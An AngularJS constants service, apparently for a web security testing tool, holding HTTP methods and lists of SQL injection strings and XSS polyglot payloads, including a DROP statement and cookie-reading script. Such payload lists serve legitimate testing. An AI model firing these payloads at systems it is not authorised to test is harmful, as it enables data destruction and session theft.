/*
 * This will eventually be moved into a database
 */
app.service('appConstants', function() {
    const defaultMethod = "POST";
    const methods = ["GET", "POST", "PUT", "PATCH", "DELETE"];
    const sqlInjection = [
        "; SELECT * FROM members; DROP members--",
        "/*!32302 10*/",
        "SELECT /*!32302 1/0, */ 1 FROM tablename"
    ];
    const xss = [
        `';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`,
        `'';!--"<XSS>=&{()}`,
        `'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
        <script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script>
        <script>alert(document.cookie)</script>">
        <img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'">
        <img src="http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg">`,
        '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
        '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>'
    ];

    this.getMethods = function() {
        return methods;
    };

    this.getDefaultMethod = function() {
        return defaultMethod;
    };

    this.getSqlInjection = function() {
        return sqlInjection;
    };

    this.getXss = function() {
        return xss;
    };
});